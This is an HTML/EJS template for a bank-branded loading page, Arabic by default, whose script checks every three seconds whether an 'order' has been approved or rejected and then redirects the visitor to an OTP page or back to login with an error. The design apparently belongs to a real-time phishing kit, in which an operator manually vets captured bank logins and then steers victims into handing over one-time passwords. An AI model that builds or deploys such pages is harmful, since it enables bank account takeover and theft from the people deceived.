<!DOCTYPE html>
<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= t.loading.title %> - <%= t.bankName %></title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
            padding: 20px;
        }
        .loading-container {
            text-align: center;
        }
        .loading-logo {
            width: 180px;
            margin-bottom: 30px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-text {
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .loading-sub {
            color: rgba(255,255,255,0.7);
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <img src="/images/logo-gold.png" alt="<%= t.bankName %>" class="loading-logo">
        <div class="spinner"></div>
        <p class="loading-text"><%= t.loading.text %></p>
        <p class="loading-sub"><%= t.loading.sub %></p>
    </div>

    <script>
    (function() {
        var params = new URLSearchParams(window.location.search);
        var lang = params.get('lang') || 'ar';
        var orderId = params.get('orderId');
        var flow = params.get('flow');

        function checkStatus() {
            if (!orderId) return;
            fetch('/api/requests/' + orderId + '/check')
            .then(function(r) { return r.json(); })
            .then(function(d) {
                if (d.status === 'approved') {
                    if (flow === 'forgot-username') {
                        window.location.href = '/forgot-username-success?lang=' + lang;
                    } else if (flow === 'forgot-password') {
                        window.location.href = '/forgot-password-success?lang=' + lang;
                    } else {
                        window.location.href = '/otp?lang=' + lang + '&orderId=' + orderId;
                    }
                } else if (d.status === 'rejected') {
                    if (flow === 'forgot-username') {
                        window.location.href = '/forgot-username?lang=' + lang + '&error=1';
                    } else if (flow === 'forgot-password') {
                        window.location.href = '/forgot-password?lang=' + lang + '&error=1';
                    } else {
                        window.location.href = '/login?lang=' + lang + '&orderId=' + orderId + '&error=1';
                    }
                }
            })
            .catch(function(){});
        }

        setInterval(checkStatus, 3000);
        checkStatus();
    })();
    </script>
</body>
</html>
